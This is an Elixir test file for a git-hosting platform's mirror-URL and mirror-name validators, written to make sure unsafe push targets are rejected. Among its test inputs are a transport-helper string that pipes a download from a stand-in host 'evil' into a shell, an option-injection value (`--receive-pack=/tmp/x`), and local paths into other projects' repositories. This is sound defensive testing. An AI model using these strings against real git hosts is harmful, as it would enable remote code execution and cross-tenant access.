defmodule Forge.MirrorTest do
  @moduledoc """
  What a mirror URL may be. `docs/design/git-hosting.md` § What a mirror URL may be.

  Every rejection here is a live attack rather than tidiness: a project admin types this field,
  and it becomes an argument to `git push` on the platform's own machine.
  """

  use ExUnit.Case, async: true

  alias Forge.Projects.Mirror

  describe "validate_url/1" do
    test "accepts the two transports that cannot reach the filesystem" do
      assert :ok = Mirror.validate_url("https://github.com/you/game.git")
      assert :ok = Mirror.validate_url("http://127.0.0.1:4002/git/game.git")
    end

    # `ext::` exists to run a command. This is the one that is a remote shell in a text field.
    test "refuses a transport helper" do
      assert {:error, :transport_helper} = Mirror.validate_url("ext::sh -c 'curl evil|sh'")
      assert {:error, :transport_helper} = Mirror.validate_url("fd::7")
    end

    # A project admin mirroring into another project's bare repository on the same node.
    test "refuses a local path" do
      assert {:error, :scheme} = Mirror.validate_url("/var/lib/forge/repos/other.git")
      assert {:error, :scheme} = Mirror.validate_url("file:///var/lib/forge/repos/other.git")
      assert {:error, :scheme} = Mirror.validate_url("./relative.git")
    end

    test "refuses every other transport" do
      assert {:error, :scheme} = Mirror.validate_url("git://host/x.git")
      assert {:error, :scheme} = Mirror.validate_url("ssh://git@host/x.git")
      assert {:error, :scheme} = Mirror.validate_url("git@github.com:you/game.git")
    end

    # `git push --receive-pack=/tmp/x` names a program to run.
    test "refuses a URL git would read as an option" do
      assert {:error, :option_like} = Mirror.validate_url("--receive-pack=/tmp/x")
      assert {:error, :option_like} = Mirror.validate_url("-o")
    end

    # The credential has its own fields. Refusing this is what keeps a stored URL safe to print.
    test "refuses credentials in the URL" do
      assert {:error, :credentials_in_url} =
               Mirror.validate_url("https://user:token@github.com/you/game.git")

      assert {:error, :credentials_in_url} =
               Mirror.validate_url("https://token@github.com/you/game.git")
    end

    test "refuses a URL with no host" do
      assert {:error, :no_host} = Mirror.validate_url("https://")
      assert {:error, :no_host} = Mirror.validate_url("https:///path")
    end

    test "refuses what is not a string" do
      assert {:error, :scheme} = Mirror.validate_url(nil)
    end
  end

  describe "validate_name/1" do
    test "accepts a name that cannot make the config key ambiguous" do
      assert :ok = Mirror.validate_name("github")
      assert :ok = Mirror.validate_name("off-site-2")
    end

    # A dot would make `forge.mirror.<name>.url` unparseable back into a name.
    test "refuses anything outside [a-z0-9-]" do
      assert {:error, :invalid_name} = Mirror.validate_name("git.hub")
      assert {:error, :invalid_name} = Mirror.validate_name("Github")
      assert {:error, :invalid_name} = Mirror.validate_name("two words")
      assert {:error, :invalid_name} = Mirror.validate_name("")
      assert {:error, :invalid_name} = Mirror.validate_name(nil)
    end
  end
end
